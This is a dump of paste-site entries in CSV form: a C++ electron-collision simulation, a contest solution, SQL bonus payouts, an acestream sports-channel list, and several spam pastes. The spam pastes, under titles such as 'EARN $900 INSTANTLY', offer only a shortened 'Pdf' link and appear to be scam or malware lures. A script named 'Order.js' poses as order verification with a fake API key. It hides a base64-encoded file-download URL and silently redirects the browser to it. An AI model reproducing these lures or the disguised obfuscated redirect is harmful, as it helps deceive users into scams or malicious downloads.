id,title,username,language,date,content
dhXmRcqC,Binance account CW,zak8203,JavaScript,Monday 31st of March 2025 12:56:31 PM CDT," 
Pdf https://tinyurl.com/methodssss


eOUN0SYFCA
"
rrYCuC4P,e-n collisions(v5) - electrons starts with maxwellian,phystota,C++,Monday 31st of March 2025 12:52:24 PM CDT,"#include <iostream>
#include <random>
#include <fstream>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota


#define n_e 100000
#define Emin 0.0
#define Emax 400.0
#define E_mean 100 // mean electron energy, initial distribution
#define bin_width 0.01
#define m_e 9.1E-31 // electron mass in kg
#define k_b 1.38E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define N ( (int)((Emax-Emin)/bin_width) ) // add 1 to include E_max if needed?
#define T_n 10.0 // Helium neutral temperature in eV
#define T_e 50.0    // electron Maxwell initial distribution
#define M_n 6.6464731E-31 // Helium atom mass
#define N_He 1000000 // Helium neutrals number
#define Volume 1.0E-12 // Volume to calculate netral density and collision frequency 
#define time 1.0E-3 // 500 microsec time to equalibrate the system

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided = false;

    //initialization function // void func(Type0& t) → means the function expects a reference to variable t of type0
    // void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis) {
    //     // velocity angles in spherical coordinates
    //     double phi = 2*M_PI*dis(gen);
    //     double cosTheta = 2.0*dis(gen) - 1.0;
    //     double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 
        
    //     energy = E_mean*dis(gen);
        
    //     double speed = sqrt(2*energy*q/m_e);

    //     vx = speed * sinTheta * cos(phi);
    //     vy = speed * sinTheta * sin(phi);
    //     vz = speed * cosTheta;
    // }

    // initializing Maxwell-Boltzmann distribution with T_e
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/m_e);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }


};


struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& elastic_CS) {


    if (energy < elastic_CS.front().energy) {
        std::cout << "" required energy value lower than range of cross-section data"" << ""\n"";
        return 0.0;
    }
    if (energy > elastic_CS.back().energy) {
        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < elastic_CS.size() && energy > elastic_CS[step].energy) {
            step++;
        }

    double k = (elastic_CS[step].sigma - elastic_CS[step-1].sigma)/(elastic_CS[step].energy - elastic_CS[step-1].energy);
    double m = elastic_CS[step].sigma - k*elastic_CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};




int main() {

    clock_t start = clock();

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<double> neutrals(N_He); // vector for neutrals
    std::vector<NeutralParticle> neutrals(N_He); 


    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram

    std::vector<double> elastic(N, 0); // precompiled cross-section energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell_neutral(1.5, T_n);
    std::gamma_distribution<double> maxwell_electron(1.5, T_e);

    std::uniform_int_distribution<int> pair(0, n_e-1);
    std::uniform_int_distribution<int> neutral_pair(0, N_He-1);    


    std::ifstream elastic_cs(""cross_sections/elastic.dat"");
    if (!elastic_cs.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }    

    // reading elastic cross section datafile

    std::vector<CrossSection> elastic_CS;

    double energy, sigma;

    while (elastic_cs >> energy >> sigma) {
        elastic_CS.push_back({energy, sigma});
    }    

    elastic_cs.close();


    std::ofstream file0(""velocities.dat"");    
    if (!file0.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file1(""energies.dat"");    
    if (!file1.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    
    std::ofstream file2(""energies_final.dat"");    
    if (!file2.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file3(""histo_random.dat"");    
    if (!file3.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""histo_maxwell.dat"");    
    if (!file4.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""neutral_distribution.dat"");    
    if (!file5.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file6(""E*f(E).dat"");    
    if (!file6.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file7(""nu_max.dat"");
    if (!file7.is_open()) {
        std::cerr << ""Error opening file7!"" << std::endl;
        return 1;
    }

    // Initialize all electrons
    for (auto& e : electrons) {
//        e.initialize(gen, dis);
        e.initialize(gen, dis, maxwell_electron);
    }
    // initialize all nenutrals
    for (auto&n : neutrals) {
        n.initialize(gen, dis, maxwell_neutral);
    }
    // precalculate cross-sections for each energy bin
    for (int i = 0; i < N; i++){
        elastic[i] = interpolate(bin_width*(i+0.5), elastic_CS);
    }


    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }


    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){
        double bin_start = Emin + i*bin_width;
        file3 << i*bin_width << "" "" <<  (i*bin_width)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // dividing by n_e to get normalized distribution
    }


    for (int i = 0; i < N_He; i++){
        int bin = (int)( (neutrals[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_neutral.size())
            histo_neutral[bin]++;
    }    

    for (int i = 0; i < histo_neutral.size(); i++){
        double bin_start = Emin + i*bin_width;
        file5 << i*bin_width << "" "" << static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this is real f(E) - normalized distribution
        file6 << i*bin_width << "" "" << (i*bin_width)*static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this should be E*f(E) 

    }   

    double nu_max = 0.0;
    double nu_max_temp = 0.0;

    for (int i = 0; i < N; i++){
        nu_max_temp = (N_He/Volume)*elastic[i] * sqrt(2.0*(i*bin_width + bin_width/2.0)*q/m_e);
        file7 << i << "" "" << nu_max_temp << ""\n"";
        if (nu_max_temp > nu_max)
            nu_max = nu_max_temp;
    }

    std::cout << nu_max << ""\n"";

    double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995
    double steps = static_cast<int>(time/dt);

//    std::cout << steps << ""\n"";

    //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
    int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;
//    int Ne_collided = n_e*0.98;  // in case I want to check smth


    // Generate shuffled list of electron indices
    std::vector<int> electron_indices(n_e);
    std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index
    std::shuffle(electron_indices.begin(), electron_indices.end(), gen); // shuffle the indexes    
    int reshuffle_interval = 1;
    int print_interval = 100;

    for (int t = 0; t < steps; t++){
        std::cout << ""timestep remains: "" << steps - t << ""\n"";

        //reshuffle the indices
        if (t % reshuffle_interval == 0) {
            std::shuffle(electron_indices.begin(), electron_indices.end(), gen);
        }

        // setting flags to false each timestep
        for (auto& e : electrons) e.collided = false;

        int collision_counter = 0;


        for (int idx : electron_indices) {

            if (collision_counter >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided) continue;  // Skip already collided electrons

            double electron_energy = e.energy;
            int bin_energy = static_cast<int>(electron_energy / bin_width);
            double nu_elastic = (N_He/Volume) * elastic[bin_energy] * sqrt(2.0*electron_energy*q/m_e);

            if (dis(gen) < nu_elastic/nu_max) {

                // ----   Collision energy redistribution module

                // electron particle X Y Z initial velocities and energy
                double V0_x_1 = e.vx;
                double V0_y_1 = e.vy;
                double V0_z_1 = e.vz;

                // neutral particle X Y Z initial velocities

                // int k = neutral_pair(gen);

                // double V0_x_2 = neutrals[k].vx;
                // double V0_y_2 = neutrals[k].vy;
                // double V0_z_2 = neutrals[k].vz;

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V0_x_2 = tmp_neutral.vx;
                double V0_y_2 = tmp_neutral.vy;
                double V0_z_2 = tmp_neutral.vz;

                // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

                double V0_rel_x = (V0_x_1 - V0_x_2);
                double V0_rel_y = (V0_y_1 - V0_y_2);
                double V0_rel_z = (V0_z_1 - V0_z_2);

                double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);

                // center-of-mass frame initial velocity (magnitude of it must be equal to the counterpart in this frame)

                double V_cm_x = (m_e*V0_x_1 + M_n*V0_x_2)/(m_e + M_n);
                double V_cm_y = (m_e*V0_y_1 + M_n*V0_y_2)/(m_e + M_n);
                double V_cm_z = (m_e*V0_z_1 + M_n*V0_z_2)/(m_e + M_n);                    

                // generating random variables to calculate random direction of center-of-mass after the collision

                double R1 = dis(gen);
                double R2 = dis(gen);

                // calculating spherical angles for center-of-mass random direction
                double theta = acos(1.0- 2.0*R1);
                double phi = 2*M_PI*R2;

                //calculating final relative velocity with random direction

                double V_rel_x = V0_rel*sin(theta)*cos(phi);
                double V_rel_y = V0_rel*sin(theta)*sin(phi);
                double V_rel_z = V0_rel*cos(theta);

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                //calculating final velocity of electron

                double V_x_1 = V_cm_x + V_rel_x * (M_n/(m_e + M_n));
                double V_y_1 = V_cm_y + V_rel_y * (M_n/(m_e + M_n));
                double V_z_1 = V_cm_z + V_rel_z * (M_n/(m_e + M_n));

                double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

                //updating electron energy and velocities
                
                e.energy = m_e*V_1*V_1/(2.0*q);
                e.vx = V_x_1;
                e.vy = V_y_1;
                e.vz = V_z_1;

                collision_counter++;

                e.collided = true;
            }             
        }
                if (t%print_interval == 0){
                // open datafiles to write each time step to see evolution
                std::ostringstream filename;
                filename << ""data/distribution_"" << std::setw(4) << std::setfill('0') << t << "".dat"";

                std::ofstream file(filename.str());
                if (!file.is_open()){
                std::cerr << ""Error opening file: "" << filename.str() << std::endl;
                return 1;
                }
                // end opening datafiles for each timestep
                
                // creating histogram each timestep
                for (int i = 0; i < n_e; i++){
                    int bin = (int)( (electrons[i].energy - Emin)/bin_width );
                    if (bin >=0 && bin < N)
                    histo_maxwell[bin]++;
                }

                // writing data each time step
                for (int i = 0; i < N; i++){
                    double bin_start = Emin + i*bin_width;
                    file << i*bin_width << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // later need to divide by total partcles number to get normalized distribution
                    histo_maxwell[i] = 0;
                }

                file.close();
                // end writing data each timestep
            }

    }


    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < histo_maxwell.size(); i++){
        check += histo_maxwell[i];
        double bin_start = Emin + i*bin_width;
        file4 << i*bin_width << "" "" <<  (i*bin_width)*static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // getting f(E)*E
    }
    std::cout << ""Total # of electrons in histo: "" << check << ""\n"";


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    std::cout << ""Ne collided each timesteps:"" << Ne_collided << ""\n"";
    std::cout << ""Energies written successfuly\n"";
    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
TRSgHr3f,投入严厉地本地 参考代码,Dmaxiya,C++,Monday 31st of March 2025 12:42:30 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100 + 100;
int T, k;
string s, t;
string ss[maxn];
map<string, char> ans;

bool judgeAns() {
    string tt = s.substr(0, k);
    for (int i = k; i < s.length(); ++i) {
        map<string, char>::iterator it = ans.find(ss[i]);
        if (it == ans.end()) {
            tt.push_back(s[i]);
            continue;
        }
        if (it->second == 0) {
            continue;
        }
        tt.push_back(it->second);
    }
    return tt == t;
}

void outputAns() {
    cout << ans.size() << endl;
    for (map<string, char>::iterator it = ans.begin(); it != ans.end(); ++it) {
        cout << ""("" << it->first << "","";
        if (it->second != 0) {
            cout << it->second;
        }
        cout << "")"" << endl;
    }
}

bool dfs(int depthS, int depthT) {
    if (depthS == s.length()) {
        if (depthT == t.length() && judgeAns()) {
            outputAns();
            return true;
        }
        return false;
    }

    map<string, char>::iterator it = ans.find(ss[depthS]);
    if (it == ans.end()) {
        ans[ss[depthS]] = 0;
        if (dfs(depthS + 1, depthT)) {
            return true;
        }
        ans[ss[depthS]] = t[depthT];
        if (dfs(depthS + 1, depthT + 1)) {
            return true;
        }
        ans.erase(ss[depthS]);
        return false;
    }

    if (it->second == 0) {
        return dfs(depthS + 1, depthT);
    }
    if (it->second != t[depthT]) {
        return false;
    }
    return dfs(depthS + 1, depthT + 1);
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> T;
    while (T--) {
        ans.clear();
        cin >> s >> t >> k;
        s = "" "" + s;
        t = "" "" + t;
        for (int i = k; i < s.length(); ++i) {
            ss[i] = s.substr(i - k + 1, k);
        }
        dfs(k, k);
    }

    return 0;
}
"
9hiha1fu,EARN $900 INSTANTLY 2025 BT,zak8203,JavaScript,Monday 31st of March 2025 12:40:35 PM CDT," 
Pdf https://tinyurl.com/methodssss


ol2VJVaPxh
"
WTHi9DLD,Untitled,Locative,SQL,Monday 31st of March 2025 12:37:23 PM CDT,"-- [ Оплата за: март]
 
--------- [ Отработанное время: ]
 
Locative: 2 (FUN) 174 (x100) -- 176
Зилиус:  0 (x100) -- 0
Khyntia: 68 (FUN), 0 (x100) -- 68
jegerm  - EN GM: 170 (FUN), 6 (x100) -- 176
Mairena: 0 (FUN) 104 (x100) -- 104
Lorad: 0 (x100) -- 0


--------- [ Бонусы: ]

UPDATE `bonus` SET `gold`=gold+4000 WHERE `id`='1407530'; -- Locative(3000ГМ + 1000РГМ)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1407530, NOW(), 4000, '+4000 золотых бонусов - з/п Ргм Locative за март');

UPDATE `bonus` SET `gold`=gold+0 WHERE `id`='229884'; -- Зилиус (ГМ)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (229884, NOW(), 0, '+0 золотых бонусов - з/п ГМ Зилиус за март');

UPDATE `bonus` SET `gold`=gold+1500 WHERE `id`='949105'; -- Khyntia (ГМ).
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (949105, NOW(), 1500, '+1500 золотых бонусов - з/п ГМ Khyntia за март'); 

UPDATE `bonus` SET `gold`=gold+3500 WHERE `id`='455260'; -- Jegerm (EN GM) + md FB.
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (455260, NOW(), 3500, '+3500 золотых бонусов - з/п ГМ Jegerm за март'); 

UPDATE `bonus` SET `gold`=gold+3000 WHERE `id`='1407530'; -- Mairena
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1407530, NOW(), 3000, '+3000 золотых бонусов - з/п ГМ Mairena за март'); 


-- Техническая поддержка

UPDATE `bonus` SET `gold`=gold+1000 WHERE `id`='456853'; -- Seanone
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (456853, NOW(), 1000, '+1000 золотых бонусов - з/п тех.поддержки Seanone за март'); 


-- QA Team

UPDATE `bonus` SET `gold`=gold+1000 WHERE `id`='211220'; -- nastyasia
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (211220, NOW(), 1000, '+1000 золотых бонусов - з/п QA-тестер nastyasia за март'); 

"
KWCHJRps,clone test,Anistorm,JSON,Monday 31st of March 2025 12:32:57 PM CDT,"{
    ""name"": ""🎈 Llista Ani 😎"",
    ""author"": ""Última actualització: 23/02/2025"",
    ""image"": ""https://i.gyazo.com/7d12c8f8374e9c1417051387b90fdfc4.jpg"",
    ""url"":""https://pastebin.com/raw/KWCHJRps"",
	""info"": ""Última actualització: 23/02/2025"",
    ""groups"":[
{""name"": ""LA LIGA"",
            ""image"": ""https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/LaLiga_logo_2023.svg/241px-LaLiga_logo_2023.svg.png"",
            ""stations"": [
{
                    ""name"": ""LA LIGA [MULTIAUDIO]"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://d3de78aebe544611a2347f54d5796bd87f16c92d"",
                    ""isHost"": true
                },
                {
                    ""name"": ""LA LIGA [MULTIAUDIO] (#2)"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://6d05b31e5e8fdae312fbd57897363a7b10ddb163"",
                    ""isHost"": true
                },
{
                    ""name"": ""LA LIGA [1080]"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://94d34491106e00394835c8cb68aa94481339b53f"",
                    ""isHost"": true
                },
{
                    ""name"": ""LA LIGA [1080] (#2)"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://cc9b7f5fe416069a2110da0909b0f915043c468b"",
                    ""isHost"": true
                },
                {
                    ""name"": ""LA LIGA [720]"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://1bc437bce57b4b0450f6d1f8d818b7e97000745e"",
                    ""isHost"": true
                },
{
                    ""name"": ""LA LIGA [NEW LOOP]"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://cc9b7f5fe416069a2110da0909b0f915043c468b"",
                    ""isHost"": true
                },
                {
                    ""name"": ""LA LIGA 2 [1080]"",
                    ""image"": ""https://i.imgur.com/cyesAMN.png"",
                    ""url"": ""acestream://83c6c4942d69f4aa324aa746c5d7dbfd7d1572b3"",
                    ""isHost"": true
                },
{
                    ""name"": ""LA LIGA 2 [720]"",
                    ""image"": ""https://i.imgur.com/cyesAMN.png"",
                    ""url"": ""acestream://f31a586422c9244196c810c84b6c85da350318a5"",
                    ""isHost"": true
                },
                {
                    ""name"": ""DAZN LA LIGA [MULTIAUDIO]"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://110d441ddc9713a7452588770d2bc85504672f47"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA [MULTIAUDIO] (#2)"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://ec29289b0b14756e686c03a501bae1efa05be70c"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA [MULTIAUDIO] (#3)"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://6de4794cd02f88f14354b5996823413a59a1de0f"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA [720]"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://8c8c1e047a1c5ed213ba74722a5345dc55c3c0eb"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA [FHD]"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://b5f549da9cafaffab01fb04567ce8a5ad4416b5c"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA [FHD] (#2)"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://a5144874f66a0872fd0b5a484cd426eb7d8eaa26"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA 2 [MULTIAUDIO]"",
                    ""image"": ""https://i.imgur.com/PgMDnz4.png"",
                    ""url"": ""acestream://97ba38d47680954be40e48bd8f43e17222fefecb"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA 2 [720]"",
                    ""image"": ""https://i.imgur.com/PgMDnz4.png"",
                    ""url"": ""acestream://51dbbfb42f8091e4ea7a2186b566a40e780953d9"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA 2 [NEW ERA]"",
                    ""image"": ""https://i.imgur.com/PgMDnz4.png"",
                    ""url"": ""acestream://fb51ef5294e99767811a3fa95a1933fb864e9ff3"",
                    ""isHost"": true
                },
{
                    ""name"": ""LALIGA TV BAR [1080]"",
                    ""image"": ""https://www.thesportsdb.com/images/media/channel/logo/f9y6oe1692444384.png"",
                    ""url"": ""acestream://608b0faf7d3d25f6fe5dba13d5e4b4142949990e"",
                    ""isHost"": true
                },
{
                    ""name"": ""LALIGA TV BAR [1080] (#2)"",
                    ""image"": ""https://www.thesportsdb.com/images/media/channel/logo/f9y6oe1692444384.png"",
                    ""url"": ""acestream://94d34491106e00394835c8cb68aa94481339b53f"",
                    ""isHost"": true
                },
{
                    ""name"": ""LALIGA TV BAR [NEW ERA II]"",
                    ""image"": ""https://www.thesportsdb.com/images/media/channel/logo/f9y6oe1692444384.png"",
                    ""url"": ""acestream://580fa1e7623d514a94e8585f90c42eda09d5e4f1"",
                    ""isHost"": true
                },
]
},
]
},"
nLgKziL7,Random Gmail Acc 1A,zak8203,JavaScript,Monday 31st of March 2025 12:24:41 PM CDT," 
Pdf https://tinyurl.com/methodssss


10YkC0tCd3
"
LpN2vf7v,EARN $900 INSTANTLY 2025 BT,XahmedX209,JavaScript,Monday 31st of March 2025 12:24:03 PM CDT," 
Pdf https://tinyurl.com/methodssss


o1ODc62be2
"
ZKDnHTCq,Random Gmail Acc 1A,XahmedX209,JavaScript,Monday 31st of March 2025 12:08:08 PM CDT," 
Pdf https://tinyurl.com/methodssss


kXHiSMrANF
"
duc7X6We,Order.js,dentira,JavaScript,Monday 31st of March 2025 11:58:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/997/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
